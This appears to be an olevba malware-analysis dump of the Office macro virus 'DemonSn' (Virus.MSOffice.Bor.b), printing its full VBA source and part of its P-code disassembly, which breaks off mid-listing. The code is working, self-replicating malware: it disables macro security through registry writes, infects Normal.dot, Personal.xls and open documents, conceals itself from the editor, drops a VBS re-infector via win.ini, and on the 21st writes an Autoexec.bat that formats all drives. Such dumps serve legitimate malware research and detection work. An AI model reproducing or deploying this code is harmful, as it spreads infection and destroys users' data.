olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Bor.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSOffice.Bor.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO DemonSn.bas 
in file: Virus.MSOffice.Bor.b - OLE stream: 'Macros/VBA/DemonSn'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'
'MyName = DemonSn.Macro_Format
'WrittenBy = DemonSn from Kz (Ust-Kamenogorsk)
'Version = 1.0

Private Declare Function RegSetValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, lpData As Any, ByVal cbData As Long) As Long
Private Declare Function RegCreateKeyExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal Reserved As Long, ByVal lpClass As String, ByVal dwOptions As Long, ByVal samDesired As Long, lpSecurityAttributes As Long, phkResult As Long, lpdwDisposition As Long) As Long
Private Declare Function ExitWindowsEx Lib "user32" (ByVal uFlags As Long, ByVal dwReserved As Long) As Long
Const hPath = "SOFTWARE\Microsoft\Office\9.0\"
Const hSec = "\Security"

Sub AutoOpen()
On Error Resume Next
Sec "Excel"
Sec "Word"
Sec "PowerPoint"
Options.VirusProtection = False
Options.ConfirmConversions = False
Options.SaveNormalPrompt = False
Call WeTrustInGod
If ShowVisualBasicEditor Then Application.Quit
End Sub

Sub Auto_Open()
On Error Resume Next
Sec "Excel"
Sec "Word"
Sec "PowerPoint"
Options.VirusProtection = False
Options.ConfirmConversions = False
Application.OnSheetActivate = "Active"
End Sub

Sub Active()
On Error Resume Next
WinDir = Environ("windir")
Personal = "\Personal.xls"
SU = Application.StartupPath
Call WeTrustInGod
If Dir(SU & Personal) = "" Then
ScreenUpdating = False
Call Hide
Kill WinDir & "\Dmnsn.dll"
ActiveWorkbook.VBProject.VBComponents("DemonSn").Export WinDir & "\Dmnsn.dll"
Workbooks.Add xlWBATWorksheet
NewBook = ActiveWorkbook.Name
ActiveWindow.Visible = False
Workbooks(NewBook).VBProject.VBComponents.Import WinDir & "\Dmnsn.dll"
Workbooks(NewBook).SaveAs SU & Personal
Application.OnSheetActivate = "Personal.xls!Active"
ScreenUpdating = True
ExitWindowsEx 6, 0
Else
If ActiveWorkbook.VBProject.VBComponents("DemonSn").CodeModule.Lines(2, 1) <> "'MyName = DemonSn.Macro_Format" Then
ActiveWorkbook.VBProject.VBComponents.Import WinDir & "\Dmnsn.dll"
End If
End If
End Sub

Sub WeTrustInGod()
On Error Resume Next
Bat = "C:\Autoexec.bat"
If Day(Date) = 21 Then
SetAttr Dat, vbNormal
Kill Bat
Open Bat For Output As #2
Print #2, "@echo off"
For I = 99 To 122
Print #2, "format " & Chr(I) & ": /autotest /q > nul"
Next I
Print #2, "format a: /autotest /q > nul"
Print #2, "format b: /autotest /q > nul"
Print #2, "cls"
For I = 0 To 9
Print #2, "echo."
Next I
Print #2, "echo                              DemonSn Virus !!!"
Close #2
ExitWindowsEx 6, 0
End If
End Sub

Sub AutoClose()
On Error Resume Next
Sec "Excel"
Sec "Word"
Sec "PowerPoint"
Call WeTrustInGod
WinDir = Environ("windir")
Options.VirusProtection = False
Options.ConfirmConversions = False
Options.SaveNormalPrompt = False
Call Hide
If NormalTemplate.VBProject.VBComponents.Item("DemonSn").CodeModule.Lines(2, 1) <> "'MyName = DemonSn.Macro_Format" Then
NormalTemplate.VBProject.VBComponents.Import WinDir & "\Dmnsn.dll"
NormalTemplate.Save
ExitWindowsEx 6, 0
End If
If ActiveDocument.VBProject.VBComponents.Item("DemonSn").CodeModule.Lines(2, 1) <> "'MyName = DemonSn.Macro_Format" Then
ActiveDocument.VBProject.VBComponents.Import WinDir & "\Dmnsn.dll"
ActiveDocument.SaveAs ActiveDocument.FullName
End If
End Sub

Sub FileSave()
On Error Resume Next
ActiveDocument.Save
Call AutoClose
End Sub

Sub FileSaveAs()
On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
Call FileSave
End Sub

Sub ToolsMacro()
On Error Resume Next
WinDir = Environ("windir")
Call Hide
For X = 1 To NormalTemplate.VBProject.VBComponents("DemonSn").CodeModule.CountOfLines - 1
CodeNT = CodeNT & NormalTemplate.VBProject.VBComponents("DemonSn").CodeModule.Lines(X, 1) & Chr(13)
Next X
NormalTemplate.VBProject.VBComponents("DemonSn").CodeModule.DeleteLines 1, NormalTemplate.VBProject.VBComponents("DemonSn").CodeModule.CountOfLines
NormalTemplate.Saved = True
If Documents.Count >= 1 Then
For Y = 1 To ActiveDocument.VBProject.VBComponents("DemonSn").CodeModule.CountOfLines - 1
CodeAD = CodeAD & ActiveDocument.VBProject.VBComponents("DemonSn").CodeModule.Lines(Y, 1) & Chr(13)
Next Y
For X = 1 To Documents.Count
Documents(X).VBProject.VBComponents("DemonSn").CodeModule.DeleteLines 1, Documents(X).VBProject.VBComponents("DemonSn").CodeModule.CountOfLines
Documents(X).Saved = True
Next X
End If
Dialogs(wdDialogToolsMacro).Show
If Not ShowVisualBasicEditor Then
NormalTemplate.VBProject.VBComponents("DemonSn").CodeModule.InsertLines 1, CodeNT
NormalTemplate.Save
If NormalTemplate.VBProject.VBComponents.Item("DemonSn").CodeModule.Lines(2, 1) <> "'MyName = DemonSn.Macro_Format" Then
NormalTemplate.VBProject.VBComponents.Import (WinDir & "\Dmnsn.dll")
NormalTemplate.Save
End If
If Documents.Count >= 1 Then
For X = 1 To Documents.Count
Documents(X).VBProject.VBComponents("DemonSn").CodeModule.InsertLines 1, CodeAD
Documents(X).SaveAs Documents(X).FullName
If Documents(X).VBProject.VBComponents.Item("DemonSn").CodeModule.Lines(2, 1) <> "'MyName = DemonSn.Macro_Format" Then
Documents(X).VBProject.VBComponents.Import WinDir & "\Dmnsn.dll"
Documents(X).SaveAs Documents(X).FullName
End If
Next X
End If
End If
End Sub

Sub ViewVBCode()
On Error Resume Next
Call Hide
NormalTemplate.VBProject.VBComponents("DemonSn").CodeModule.DeleteLines 1, NormalTemplate.VBProject.VBComponents("DemonSn").CodeModule.CountOfLines
NormalTemplate.Saved = True
NormalTemplate.VBProject.VBComponents.Remove NormalTemplate.VBProject.VBComponents("DemonSn")
NormalTemplate.Saved = True
If Application.Documents.Count >= 1 Then
For X = 1 To Application.Documents.Count
Documents(X).VBProject.VBComponents("DemonSn").CodeModule.DeleteLines 1, Documents(X).VBProject.VBComponents("DemonSn").CodeModule.CountOfLines
Documents(X).Saved = True
Documents(X).VBProject.VBComponents.Remove Documents(X).VBProject.VBComponents("DemonSn")
Documents(X).Saved = True
Next X
End If
Application.ShowVisualBasicEditor = True
End Sub

Sub Sec(ByVal N As String)
On Error Resume Next
Level& = 1
RegCreateKeyExA &H80000001, hPath & N & hSec, 0, "", 0, 0, 0, hKey, 2
RegSetValueExA hKey, "Level", 0, 4, Level, 4
End Sub

Sub Hide()
On Error Resume Next
Sec "Excel"
Sec "Word"
Sec "PowerPoint"
WinDir = Environ("windir")
Kill (WinDir & "\Dmnsn.dll")
ActiveDocument.VBProject.VBComponents("DemonSn").Export (WinDir & "\Dmnsn.dll")
NormalTemplate.VBProject.VBComponents("DemonSn").Export (WinDir & "\Dmnsn.dll")
WinDir = Environ("windir")
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RegisteredOwner") = "The DemonSn"
Open WinDir & "\Win.ini" For Input As #1
Infected = False
Do While Not EOF(1)
Line Input #1, Line
If Line = "Run=DemonSn.vbs" Then Infected = True
Loop
Close #1
If Not Infected Then
Open WinDir & "\win.ini" For Input As #1
Open "c:\Win._ni" For Output As #2
Do While Not EOF(1)
Line Input #1, Line
If Line = "[windows]" Then
Print #2, Line
Print #2, "Run=DemonSn.vbs"
Else
Print #2, Line
End If
Loop
Close #1
Close #2
End If
FileCopy "c:\win._ni", WinDir & "\Win.ini"
Kill "c:\win._ni"
Kill WinDir & "\DemonSn.vbs"
Open WinDir & "\DemonSn.vbs" For Append As #1
Print #1, "On Error Resume Next"
Print #1, "Set Word = CreateObject(" & Chr(34) & "Word.Application" & Chr(34) & ")"
Print #1, "Word.Options.SaveNormalPrompt = False"
Print #1, "Word.NormalTemplate.VBProject.VBComponents.Remove Word.NormalTemplate.VBProject.VBComponents(" & Chr(34) & "DemonSn" & Chr(34) & ")"
Print #1, "Word.NormalTemplate.VBProject.VBComponents.Import (" & Chr(34) & WinDir & "\Dmnsn.dll" & Chr(34) & ")"
Print #1, "Word.NormalTemplate.Save"
Print #1, "Word.Quit"
Print #1, "Set ExcelObj = CreateObject(" & Chr(34) & "Excel.Application" & Chr(34) & ")"
Print #1, "Set FSO = CreateObject(" & Chr(34) & "Scripting.FileSystemObject" & Chr(34) & ")"
Print #1, "FSO.DeleteFile ExcelObj.StartupPath & " & Chr(34) & "\Personal.xls" & Chr(34)
Print #1, "ExcelObj.Workbooks.Add 1"
Print #1, "ExcelObj.Workbooks(1).VBProject.VBComponents.Import (" & Chr(34) & WinDir & "\Dmnsn.dll" & Chr(34) & ")"
Print #1, "ExcelObj.ActiveWindow.Visible = False"
Print #1, "ExcelObj.OnSheetActivate = " & Chr(34) & "Personal.xls!Active" & Chr(34)
Print #1, "ExcelObj.Workbooks(1).SaveAs ExcelObj.StartupPath & " & Chr(34) & "\Personal.xls" & Chr(34)
Print #1, "ExcelObj.Quit"
Close #1
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSOffice.Bor.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/DemonSn - 14795 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0000 ""
' Line #1:
' 	QuoteRem 0x0000 0x001D "MyName = DemonSn.Macro_Format"
' Line #2:
' 	QuoteRem 0x0000 0x002D "WrittenBy = DemonSn from Kz (Ust-Kamenogorsk)"
' Line #3:
' 	QuoteRem 0x0000 0x000D "Version = 1.0"
' Line #4:
' Line #5:
' 	FuncDefn (Private Declare Function RegSetValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, lpData As , ByVal cbData As Long) As Long)
' Line #6:
' 	FuncDefn (Private Declare Function RegCreateKeyExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal Reserved As Long, ByVal lpClass As String, ByVal dwOptions As Long, ByVal samDesired As Long, lpSecurityAttributes As Long, phkResult As Long, lpdwDisposition As Long) As Long)
' Line #7:
' 	FuncDefn (Private Declare Function ExitWindowsEx Lib "user32" (ByVal uFlags As Long, ByVal dwReserved As Long) As Long)
' Line #8:
' 	Dim (Const) 
' 	LitStr 0x001E "SOFTWARE\Microsoft\Office\9.0\"
' 	VarDefn hPath
' Line #9:
' 	Dim (Const) 
' 	LitStr 0x0009 "\Security"
' 	VarDefn hSec
' Line #10:
' Line #11:
' 	FuncDefn (Sub AutoOpen())
' Line #12:
' 	OnError (Resume Next) 
' Line #13:
' 	LitStr 0x0005 "Excel"
' 	ArgsCall Sec 0x0001 
' Line #14:
' 	LitStr 0x0004 "Word"
' 	ArgsCall Sec 0x0001 
' Line #15:
' 	LitStr 0x000A "PowerPoint"
' 	ArgsCall Sec 0x0001 
' Line #16:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #17:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #18:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #19:
' 	ArgsCall (Call) WeTrustInGod 0x0000 
' Line #20:
' 	Ld ShowVisualBasicEditor 
' 	If 
' 	BoSImplicit 
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' 	EndIf 
' Line #21:
' 	EndSub 
' Line #22:
' Line #23:
' 	FuncDefn (Sub Auto_Open())
' Line #24:
' 	OnError (Resume Next) 
' Line #25:
' 	LitStr 0x0005 "Excel"
' 	ArgsCall Sec 0x0001 
' Line #26:
' 	LitStr 0x0004 "Word"
' 	ArgsCall Sec 0x0001 
' Line #27:
' 	LitStr 0x000A "PowerPoint"
' 	ArgsCall Sec 0x0001 
' Line #28:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #29:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #30:
' 	LitStr 0x0006 "Active"
' 	Ld Application 
' 	MemSt OnSheetActivate 
' Line #31:
' 	EndSub 
' Line #32:
' Line #33:
' 	FuncDefn (Sub Active())
' Line #34:
' 	OnError (Resume Next) 
' Line #35:
' 	LitStr 0x0006 "windir"
' 	ArgsLd Environ 0x0001 
' 	St WinDir 
' Line #36:
' 	LitStr 0x000D "\Personal.xls"
' 	St Personal 
' Line #37:
' 	Ld Application 
' 	MemLd StartupPath 
' 	St SU 
' Line #38:
' 	ArgsCall (Call) WeTrustInGod 0x0000 
' Line #39:
' 	Ld SU 
' 	Ld Personal 
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #40:
' 	LitVarSpecial (False)
' 	St ScreenUpdating 
' Line #41:
' 	ArgsCall (Call) Hide 0x0000 
' Line #42:
' 	Ld WinDir 
' 	LitStr 0x000A "\Dmnsn.dll"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #43:
' 	Ld WinDir 
' 	LitStr 0x000A "\Dmnsn.dll"
' 	Concat 
' 	LitStr 0x0007 "DemonSn"
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #44:
' 	Ld xlWBATWorksheet 
' 	Ld Workbooks 
' 	ArgsMemCall Add 0x0001 
' Line #45:
' 	Ld ActiveWorkbook 
' 	MemLd New 
' 	St NewBook 
' Line #46:
' 	LitVarSpecial (False)
' 	Ld ActiveWindow 
' 	MemSt Visible 
' Line #47:
' 	Ld WinDir 
' 	LitStr 0x000A "\Dmnsn.dll"
' 	Concat 
' 	Ld NewBook 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #48:
' 	Ld SU 
' 	Ld Personal 
' 	Concat 
' 	Ld NewBook 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall SaveAs 0x0001 
' Line #49:
' 	LitStr 0x0013 "Personal.xls!Active"
' 	Ld Application 
' 	MemSt OnSheetActivate 
' Line #50:
' 	LitVarSpecial (True)
' 	St ScreenUpdating 
' Line #51:
' 	LitDI2 0x0006 
' 	LitDI2 0x0000 
' 	ArgsCall ExitWindowsEx 0x0002 
' Line #52:
' 	ElseBlock 
' Line #53:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	LitStr 0x0007 "DemonSn"
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001E "'MyName = DemonSn.Macro_Format"
' 	Ne 
' 	IfBlock 
' Line #54:
' 	Ld WinDir 
' 	LitStr 0x000A "\Dmnsn.dll"
' 	Concat 
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #55:
' 	EndIfBlock 
' Line #56:
' 	EndIfBlock 
' Line #57:
' 	EndSub 
' Line #58:
' Line #59:
' 	FuncDefn (Sub WeTrustInGod())
' Line #60:
' 	OnError (Resume Next) 
' Line #61:
' 	LitStr 0x000F "C:\Autoexec.bat"
' 	St Bat 
' Line #62:
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0015 
' 	Eq 
' 	IfBlock 
' Line #63:
' 	Ld Dat 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #64:
' 	Ld Bat 
' 	ArgsCall Kill 0x0001 
' Line #65:
' 	Ld Bat 
' 	LitDI2 0x0002 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #66:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@echo off"
' 	PrintItemNL 
' Line #67:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0063 
' 	LitDI2 0x007A 
' 	For 
' Line #68:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "format "
' 	Ld I 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0014 ": /autotest /q > nul"
' 	Concat 
' 	PrintItemNL 
' Line #69:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #70:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001C "format a: /autotest /q > nul"
' 	PrintItemNL 
' Line #71:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001C "format b: /autotest /q > nul"
' 	PrintItemNL 
' Line #72:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "cls"
' 	PrintItemNL 
' Line #73:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0009 
' 	For 
' Line #74:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "echo."
' 	PrintItemNL 
' Line #75:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #76:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0033 "echo                              DemonSn Virus !!!"
' 	PrintItemNL 
' Line #77:
' 	LitDI2 0x0002 
' 	Sharp 
' 	Close 0x0001 
' Line #78:
' 	LitDI2 0x0006 
' 	LitDI2 0x0000 
' 	ArgsCall ExitWindowsEx 0x0002 
' Line #79:
' 	EndIfBlock 
' Line #80:
' 	EndSub 
' Line #81:
' Line #82:
' 	FuncDefn (Sub AutoClose())
' Line #83:
' 	OnError (Resume Next) 
' Line #84:
' 	LitStr 0x0005 "Excel"
' 	ArgsCall Sec 0x0001 
' Line #85:
' 	LitStr 0x0004 "Word"
' 	ArgsCall Sec 0x0001 
' Line #86:
' 	LitStr 0x000A "PowerPoint"
' 	ArgsCall Sec 0x0001 
' Line #87:
' 	ArgsCall (Call) WeTrustInGod 0x0000 
' Line #88:
' 	LitStr 0x0006 "windir"
' 	ArgsLd Environ 0x0001 
' 	St WinDir 
' Line #89:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #90:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #91:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #92:
' 	ArgsCall (Call) Hide 0x0000 
' Line #93:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	LitStr 0x0007 "DemonSn"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001E "'MyName = DemonSn.Macro_Format"
' 	Ne 
' 	IfBlock 
' Line #94:
' 	Ld WinDir 
' 	LitStr 0x000A "\Dmnsn.dll"
' 	Concat 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #95:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #96:
' 	LitDI2 0x0006 
' 	LitDI2 0x0000 
' 	ArgsCall ExitWindowsEx 0x0002 
' Line #97:
' 	EndIfBlock 
' Line #98:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	LitStr 0x0007 "DemonSn"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001E "'MyName = DemonSn.Macro_Format"
' 	Ne 
' 	IfBlock 
' Line #99:
' 	Ld WinDir 
' 	LitStr 0x000A "\Dmnsn.dll"
' 	Concat 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #100:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #101:
' 	EndIfBlock 
' Line #102:
' 	EndSub 
' Line #103:
' Line #104:
' 	FuncDefn (Sub FileSave())
' Line #105:
' 	OnError (Resume Next) 
' Line #106:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #107:
' 	ArgsCall (Call) AutoClose 0x0000 
' Line #108:
' 	EndSub 
' Line #109:
' Line #110:
' 	FuncDefn (Sub FileSaveAs())
' Line #111:
' 	OnError (Resume Next) 
' Line #112:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #113:
' 	ArgsCall (Call) FileSave 0x0000 
' Line #114:
' 	EndSub 
' Line #115:
' Line #116:
' 	FuncDefn (Sub ToolsMacro())
' Line #117:
' 	OnError (Resume Next) 
' Line #118:
' 	LitStr 0x0006 "windir"
' 	ArgsLd Environ 0x0001 
' 	St WinDir 
' Line #119:
' 	ArgsCall (Call) Hide 0x0000 
' Line #120:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitStr 0x0007 "DemonSn"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Sub 
' 	For 
' Line #121:
' 	Ld CodeNT 
' 	Ld X 
' 	LitDI2 0x0001 
' 	LitStr 0x0007 "DemonSn"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St CodeNT 
' Line #122:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	NextVar 
' Line #123:
' 	LitDI2 0x0001 
' 	LitStr 0x0007 "DemonSn"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitStr 0x0007 "DemonSn"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #124:
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #125:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	Ge 
' 	IfBlock 
' Line #126:
' 	StartForVariable 
' 	Ld Y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitStr 0x0007 "DemonSn"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Sub 
' 	For 
' Line #127:
' 	Ld CodeAD 
' 	Ld Y 
' 	LitDI2 0x0001 
' 	LitStr 0x0007 "DemonSn"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St CodeAD 
' Line #128:
' 	StartForVariable 
' 	Ld Y 
' 	EndForVariable 
' 	NextVar 
' Line #129:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Documents 
' 	MemLd Count 
' 	For 
' Line #130:
' 	LitDI2 0x0001 
' 	LitStr 0x0007 "DemonSn"
' 	Ld X 
' 	ArgsLd Documents 0x0001 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitStr 0x0007 "DemonSn"
' 	Ld X 
' 	ArgsLd Documents 0x0001 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #131:
' 	LitVarSpecial (True)
' 	Ld X 
' 	ArgsLd Documents 0x0001 
' 	MemSt Saved 
' Line #132:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	NextVar 
' Line #133:
' 	EndIfBlock 
' Line #134:
' 	Ld wdDialogToolsMacro 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #135:
' 	Ld ShowVisualBasicEditor 
' 	Not 
' 	IfBlock 
' Line #136:
' 	LitDI2 0x0001 
' 	Ld CodeNT 
' 	LitStr 0x0007 "DemonSn"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #137:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #138:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	LitStr 0x0007 "DemonSn"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001E "'MyName = DemonSn.Macro_Format"
' 	Ne 
' 	IfBlock 
' Line #139:
' 	Ld WinDir 
' 	LitStr 0x000A "\Dmnsn.dll"
' 	Concat 
' 	Paren 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #140:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #141:
' 	EndIfBlock 
' Line #142:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	Ge 
' 	IfBlock 
' Line #143:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Documents 
' 	MemLd Count 
' 	For 
' Line #144:
' 	LitDI2 0x0001 
' 	Ld CodeAD 
' 	LitStr 0x0007 "DemonSn"
' 	Ld X 
' 	ArgsLd Documents 0x0001 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #145:
' 	Ld X 
' 	ArgsLd Documents 0x0001 
' 	MemLd FullName 
' 	Ld X 
' 	ArgsLd Documents 0x0001 
' 	ArgsMemCall SaveAs 0x0001 
' Line #146:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	LitStr 0x0007 "DemonSn"
' 	Ld X 
' 	ArgsLd Documents 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x001E "'MyName = DemonSn.Macro_Format"
' 	Ne 
' 	IfBlock 
' Line #147:
' 	Ld WinDir 
' 	LitStr 0x000A "\Dmnsn.dll"
' 	Concat 
' 	Ld X 
' 	ArgsLd Documents 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #148:
' 	Ld X 
' 	ArgsLd Documents 0x0001 
' 	MemLd FullName 
' 	Ld X 
' 	ArgsLd Documents 0x0001 
' 	ArgsMemCall SaveAs 0x0001 
' Line #149:
' 	EndIfBlock 
' Line #150:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	NextVar 
' Line #151:
' 	EndIfBlock 
' Line #152:
' 	EndIfBlock 
' Line #153:
' 	EndSub 
' Line #154:
' Line #155:
' 	FuncDefn (Sub ViewVBCode())
' Line #156:
' 	OnError (Resume Next) 
' Line #157:
' 	ArgsCall (Call) Hide 0x0000 
' Line #158:
' 	LitDI2 0x0001 
' 	LitStr 0x0007 "DemonSn"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitStr 0x0007 "DemonSn"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #159:
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #160:
' 	LitStr 0x0007 "DemonSn"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Remove 0x0001 
' Line #161:
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
